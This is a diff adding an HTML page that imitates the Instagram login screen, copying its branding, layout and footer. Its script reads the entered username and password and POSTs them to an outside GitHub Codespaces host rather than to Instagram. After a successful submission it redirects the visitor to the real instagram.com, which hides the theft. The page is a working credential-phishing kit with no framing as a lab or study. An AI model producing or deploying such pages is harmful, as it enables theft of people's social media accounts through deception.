@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <h1 class="logo">Instagram</h1>
+    <!-- Login Form -->
+    <form class="login-form" id="loginForm">
+      <input type="text" id="username" placeholder="Phone number, username, or email" class="input-field" required>
+      <input type="password" id="password" placeholder="Password" class="input-field" required>
+      <button type="button" id="submitBtn" class="login-button">Log in</button>
+      <div class="separator">OR</div>
+      <button type="button" class="facebook-login">Log in with Facebook</button>
+      <a href="#" class="forgot-password">Forgot password?</a>
+    </form>
+    <!-- Sign Up Prompt -->
+    <div class="signup-prompt">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+    <!-- App Links -->
+    <div class="app-links">
+      <p>Get the app.</p>
+      <div class="buttons">
+        <img src="gplay.png" alt="Google Play" height="40px">
+        <img src="micro.png" alt="Microsoft Store" height="40px">
+      </div>
+    </div>
+    <!-- Footer -->
+    <footer>
+      <ul>
+        <li><a href="#">Meta</a></li>
+        <li><a href="#">About</a></li>
+        <li><a href="#">Blog</a></li>
+        <li><a href="#">Jobs</a></li>
+        <li><a href="#">Help</a></li>
+        <li><a href="#">API</a></li>
+        <li><a href="#">Privacy</a></li>
+      </ul>
+      <p>© 2024 Instagram from Meta</p>
+    </footer>
+  </div>
+
+  <!-- JavaScript for AJAX Fetch -->
+  <script>
+    document.getElementById('submitBtn').addEventListener('click', () => {
+      // Get user input values
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Validate inputs
+      if (!username || !password) {
+        alert('Please fill in both fields.');
+        return;
+      }
+
+      // Send data to the server using Fetch API
+      fetch('https://organic-giggle-gjg74grvp67cpw94-3000.app.github.dev/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username, password })
+      })
+      .then(response => response.json()) // Assuming the server sends a JSON response
+      .then(data => {
+        if (data.success) {
+          
+          window.location.href = 'https://instagram.com';
+          console.log('Server Response:', data);
+        } else {
+          alert('Login failed: ' + data.message);
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('An error occurred while logging in.');
+      });
+    });
+  </script>
+</body>
+</html>
